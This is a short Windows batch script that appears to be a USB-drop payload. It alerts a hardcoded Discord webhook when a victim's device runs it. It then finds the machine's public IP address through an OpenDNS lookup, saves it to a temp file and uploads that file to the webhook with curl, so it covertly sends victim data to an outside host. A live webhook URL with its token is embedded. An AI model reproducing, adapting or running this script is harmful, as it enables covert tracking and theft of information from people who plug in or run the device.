@echo off

set "helper=https://discord.com/api/webhooks/1091412540560515102/EMUhiI4GkG43OupicZBbmhtu1tFrfEcmZ8_Lwi7gmIX2rw0qRnm6QQb7fz4budBNwx33"

curl -X POST -H "Content-type: application/json" --data "{\"content\": \"***franu5 usb has detected new device! (%TIME%)*** \"}" %helper%


curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```public ip address```\"}"  %helper%
nslookup myip.opendns.com resolver1.opendns.com > %temp%/PublicIP.txt
curl --silent --output /dev/null -F s=@"%temp%/PublicIP.txt" %helper%
nslookup myip.opendns.com resolver1.opendns.com
